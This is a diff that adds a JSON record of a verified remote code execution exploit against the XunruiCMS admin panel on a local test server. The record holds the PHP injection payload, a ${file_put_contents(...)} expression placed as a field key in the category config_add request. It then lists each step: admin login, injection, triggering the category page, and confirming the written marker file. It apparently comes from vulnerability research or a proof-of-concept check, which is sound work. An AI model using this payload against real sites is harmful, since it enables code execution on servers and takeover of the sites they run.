@@ -1,0 +1,45 @@
+{
+  "payload_key": "${file_put_contents(\"v1_ok.txt\", \"V1_RCE_OK_\".md5(\"v1\"))}",
+  "expected_marker": "V1_RCE_OK_6654c734ccab8f440ff0825eb443dc7f",
+  "marker_http_status": 200,
+  "marker_content": "V1_RCE_OK_6654c734ccab8f440ff0825eb443dc7f",
+  "rce_verified": true,
+  "transcript": [
+    {
+      "step": "login",
+      "method": "POST",
+      "url": "http://127.0.0.1:8080/admin.php?c=login&m=index",
+      "status": 200,
+      "sent": {
+        "data[username]": "admin",
+        "data[password]": "<md5(password)>"
+      },
+      "body_preview": "{\"code\":1,\"msg\":\"ok\",\"data\":{\"sync\":[],\"url\":\"admin.php?time=1793049631\"}}"
+    },
+    {
+      "step": "config_add",
+      "method": "POST",
+      "url": "http://127.0.0.1:8080/admin.php?c=category&m=config_add",
+      "status": 200,
+      "sent": {
+        "data[list_field][${file_put_contents(\"v1_ok.txt\", \"V1_RCE_OK_\".md5(\"v1\"))}][use]": "1",
+        "data[list_field][${file_put_contents(\"v1_ok.txt\", \"V1_RCE_OK_\".md5(\"v1\"))}][name]": "V1"
+      },
+      "body_preview": "{\"code\":1,\"msg\":\"操作成功\",\"data\":[]}"
+    },
+    {
+      "step": "trigger (category index)",
+      "method": "GET",
+      "url": "http://127.0.0.1:8080/admin.php?c=category&m=index",
+      "status": 200,
+      "body_preview": "<!--当前页面的模板文件是：/www/xunruicms/dayrui/App/Cms/Views/share_category_list.html （本代码只在开发者模式下显示）-->\n<!DOCTYPE html>\n<html lang=\"zh-cn\" class=\"page-index-old\">\n<head>\n<script type=\"text/javascript\"  id=\"debugbar_loader\" data-time=\"1793049631\" src=\"http://127.0.0.1:8080/admin.php?debugbar\"></script><script type=\"text/javascript\"  id=\"debugbar_dynamic_script\"></script><style type=\"text/css\"  id=\"debugbar_"
+    },
+    {
+      "step": "verify marker file",
+      "method": "GET",
+      "url": "http://127.0.0.1:8080/v1_ok.txt",
+      "status": 200,
+      "body_preview": "V1_RCE_OK_6654c734ccab8f440ff0825eb443dc7f"
+    }
+  ]
+}
